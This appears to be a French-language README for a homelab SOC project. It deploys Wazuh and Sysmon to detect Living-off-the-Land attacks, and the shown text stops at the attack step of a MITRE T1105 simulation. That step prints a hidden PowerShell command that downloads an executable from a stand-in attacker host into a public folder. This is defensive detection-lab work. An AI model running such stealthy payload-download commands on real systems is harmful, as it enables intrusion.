# Déploiement d'un SOC Virtualisé & Détection d'Attaques Avancées

## 🎯 Objectif du Projet
Création d'un homelab complet pour simuler un environnement d'entreprise. L'objectif est de déployer un SIEM (Wazuh), de configurer une collecte de journaux avancée sur les postes clients via Sysmon, et de démontrer la capacité à détecter des attaques de type "Living off the Land" (LotL) et des contournements de sécurité.

## Technologies & Outils
*   **SIEM / XDR :** Wazuh (Manager) hébergé sur Ubuntu Server.
*   **Endpoint (Cible) :** Windows 10 avec Wazuh Agent & Microsoft Sysmon.
*   **Attaquant :** Kali Linux.
*   **Hyperviseur :** QEMU/KVM (Virt-Manager).

## Architecture du Laboratoire
1.  **Serveur Central :** Réception des logs via les règles natives Wazuh.
2.  **Machine Cible (Windows) :** Déploiement de la configuration Sysmon (*SwiftOnSecurity*) pour pallier le manque de visibilité des journaux Windows natifs (notamment sur la création de processus et les requêtes réseau).
3.  **Machine Attaquante (Kali) :** Génération du bruit, tests de pénétration et exécution des charges utiles.

---

## Cas d'usage : Simulation & Détection (MITRE ATT&CK T1105)

### 1. L'Attaque (Ingress Tool Transfer)
Simulation d'un téléchargement furtif d'une charge utile malveillante par un attaquant ayant obtenu un accès initial. L'attaque utilise PowerShell pour contourner certaines restrictions et déposer un exécutable dans un dossier public.

**Commande exécutée sur la cible :**
```powershell
powershell.exe -nop -w hidden -c "Invoke-WebRequest -Uri 'http://[IP_KALI]/malware_test.exe' -OutFile 'C:\Users\Public\malware_test.exe'"
